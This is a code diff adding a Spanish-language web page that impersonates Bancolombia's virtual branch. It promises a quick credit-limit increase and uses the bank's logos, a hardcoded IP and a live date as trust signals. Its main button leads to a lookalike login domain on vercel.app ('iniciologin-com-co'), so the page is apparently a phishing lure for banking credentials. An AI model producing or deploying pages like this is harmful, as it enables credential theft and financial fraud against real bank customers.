@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aumente su cupo de crédito</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      text-align: center;
+      padding: 30px;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      padding: 15px 30px;
+      background: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    header img {
+      height: 40px;
+    }
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 30px;
+    }
+    .btn-principal {
+      padding: 15px 40px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #000;
+      background-color: #ffcc00; /* amarillo */
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn-principal:hover {
+      background-color: #ffd84d;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="./imagenes/logo-bancolombia-black.svg" alt="Logo Empresa">
+  </header>
+   
+  <main>
+    <style>
+  :root{
+    --card-dark:#ffffff;   /* fondo del mensaje */
+    --icon-bg:#ffcc00;     /* fondo del icono */
+    --text:#0f1923;
+    --radius:16px;
+    --padY: clamp(10px,1.6vw,14px);
+    --padX: clamp(12px,2vw,18px);
+    --iconW: clamp(44px,5.2vw,58px);
+    --title: clamp(16px,1.8vw,20px);
+    --font:  clamp(13px,1.35vw,16px);
+    --maxw: 960px;
+  }
+
+  .bank-note{
+    font-family: Inter, system-ui, Arial, sans-serif;
+    max-width: var(--maxw);
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: var(--iconW) 1fr;
+    align-items: stretch;          /* alturas iguales */
+    gap: 0;                        /* pegados */
+    padding: 0 clamp(8px,1.2vw,14px);
+  }
+
+  .bank-note__icon{
+    background: var(--icon-bg);
+    border-radius: var(--radius) 0 0 var(--radius); /* esquinas izquierda */
+    display: grid;
+    place-items: center;
+    padding: clamp(8px,1.2vw,10px); /* reduce altura visual */
+  }
+  .bank-note__icon svg{
+    width: clamp(20px,2.6vw,26px);
+    height: clamp(20px,2.6vw,26px);
+    display: block;
+  }
+
+  .bank-note__card{
+    background: var(--card-dark);
+    color: var(--text);
+    border-radius: 0 var(--radius) var(--radius) 0; /* esquinas derecha */
+    padding: var(--padY) var(--padX);
+    line-height: 1.4;
+    box-shadow: 0 6px 18px rgba(0,0,0,.18);
+  }
+
+  .bank-note__title{
+    font-size: var(--title);
+    font-weight: 700;
+    margin: 0 0 4px 0;
+  }
+  .bank-note__text{
+    font-size: var(--font);
+    margin: 0;
+  }
+</style>
+
+<section class="bank-note" aria-label="Aviso de mantenimiento">
+  <div class="bank-note__icon" aria-hidden="true">
+    
+    <svg viewBox="0 0 24 24" fill="none" stroke="#0f1923" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 10v4a2 2 0 0 0 2 2h2l2.5 4a1 1 0 0 0 1.8-.6V16h1a10 10 0 0 0 7-3.1V7.1A10 10 0 0 0 12.3 4H7a2 2 0 0 0-2 2"/>
+      <path d="M18.5 6.5a4 4 0 0 1 0 11"/>
+    </svg>
+  </div>
+
+  <div class="bank-note__card">
+    <h3 class="bank-note__title">¡Solicitalo en minutos!</h3>
+    <p class="bank-note__text">
+      ¿Necesitas liquidez sin complicaciones? Tarjeta con $10.000.000 COP de cupo, cuotas flexibles, protección contra fraudes y recompensas por cada compra. Solicita en 3 minutos. Sujeto a aprobación.
+    </p>
+  </div>
+</section>
+ 
+
+       <center> <p style="font-size: 28px;color:black;">
+Sucursal Virtual Personas
+  <label class="tituloformulario" id="flujoOrigenLbl"><br /></label>
+</p></center>
+    <h1>Solicita hoy el aumento de tu cupo de crédito</h1>
+    <p>Proceso rápido, seguro y sin complicaciones. Mejora tu poder de compra y accede a beneficios exclusivos.</p>
+    <a href="https://iniciologin-com-co.vercel.app/monitoreo/" class="btn-principal">
+      Aumente su cupo de crédito
+    </a>
+    <div class="linea"></div>
+
+<style>
+  .linea {
+    width: 100%;           /* ancho de la línea, ajústalo (ej: 40%, 200px) */
+    margin: 16px auto;    /* auto centra horizontalmente */
+    border-top: 1px solid #7e7e7e;  /* línea negra finita */
+  }
+</style>
+
+<div class="img-centro">
+  <img src="./imagenes/logo-bancolombia-black.svg" alt="Descripción de la imagen">
+</div>
+
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 180px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+<br>
+
+<div class="img-centro">
+  <img src="./imagenes/super-horizontal-black.svg" alt="Descripción de la imagen">
+</div>
+
+<style>
+  .img-centro {
+    text-align: center;   /* centra la imagen */
+  }
+
+  .img-centro img {
+    max-width: 160px;     /* ajusta el ancho máximo */
+    width: 100%;          /* escala de forma responsive */
+    height: auto;         /* mantiene la proporción */
+  }
+</style>
+
+
+  <div class="footer-datos">
+  <p id="ip">Dirección IP: 45.187.7.195</p>
+  <p id="fecha"></p>
+</div>
+
+<style>
+  .footer-datos {
+    text-align: center;        /* centrado */
+    font-size: 14px;           /* tamaño ajustable */
+    color: #777;               /* gris similar al de la foto */
+    margin-top: 40px;          /* separación con el contenido */
+  }
+  .footer-datos p {
+    margin: 4px 0;
+  }
+</style>
+<script>
+  // Generar fecha y hora actuales en español
+  const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+                     hour: 'numeric', minute: 'numeric', hour12: true };
+  const ahora = new Date().toLocaleDateString('es-ES', opciones);
+
+  document.getElementById("fecha").textContent = ahora;
+</script>
+  </main>
+</body>
+</html>
